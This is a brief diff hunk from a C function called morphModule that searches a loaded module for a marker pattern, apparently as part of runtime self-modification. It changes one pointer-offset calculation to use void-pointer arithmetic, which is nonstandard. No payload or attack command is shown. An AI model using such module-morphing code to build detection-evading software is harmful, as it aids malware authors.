@@ -110,7 +110,7 @@ VOID morphModule()
                     dwRegionCount++;
 
                     pbyLastMatch++;
-                    dwMatchOffset = (DWORD)pbyLastMatch - (DWORD)modInfo.lpBaseOfDll;
+                    dwMatchOffset = (LPVOID) pbyLastMatch - modInfo.lpBaseOfDll;
                 }
                     // If the marker pattern is not found, set the morphing status to finished.
                 else
